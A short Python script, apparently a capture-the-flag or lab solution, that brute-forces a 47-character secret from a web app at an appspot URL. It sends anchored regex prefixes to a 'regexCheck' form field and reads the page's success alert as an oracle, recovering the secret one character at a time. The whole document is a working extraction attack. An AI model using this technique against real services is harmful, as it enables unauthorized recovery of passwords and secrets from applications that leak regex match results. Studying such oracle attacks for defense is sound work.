#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, ascii_uppercase

def checkRegex(regex):
	URL = 'https://learn-gcp-286602.uc.r.appspot.com/'

	regexInput = regex
	data = {'regexCheck' : regexInput}
	queryResult = requests.post(URL, data)
	page = queryResult.content
	#print(page)

	soup = BeautifulSoup(page, 'html.parser')
	resultDiv = soup.find('div', class_='alert')
	if resultDiv:
		return 'alert-success' in resultDiv.get_attribute_list('class')
	else:
		return None


URL = 'https://learn-gcp-286602.uc.r.appspot.com/'

passwordList = []
for position in range(47):
	possibleCharacters = ['[a-z]', '[A-Z]', '[0-9]', '_', '-', '!']
	password = ''.join(passwordList)
	for charType in possibleCharacters:
		#regexInput = r'^{}\{\}[a-zA-Z0-9_!-]{47}$'.format(''.join(password))
		regexInput = '^{}{}'.format(password, charType)
		#print('Checking charType {} for pos {} : {}'.format(charType, position, regexInput))
		if checkRegex(regexInput):
			print('{} : {}'.format(position, charType))
			correctCharType = charType
			break
	#print('Found correct char type')
	if correctCharType == '[a-z]':
		for c in ascii_lowercase:
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('correct = {} : {}'.format(position, c))
				passwordList.append(c)
				break
	elif correctCharType == '[A-Z]':
		for c in ascii_uppercase:
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('correct = {} : {}'.format(position, c))
				passwordList.append(c)
				break
	elif correctCharType == '[0-9]':
		for c in range(10):
			regexInput = '^{}{}'.format(password, c)
			if checkRegex(regexInput):
				print('correct = {} : {}'.format(position, c))
				passwordList.append(str(c))
				break
	else:
		c = correctCharType
		print('{} : {}'.format(position, c))
		passwordList.append(c)

password = str(passwordList)
print(password)
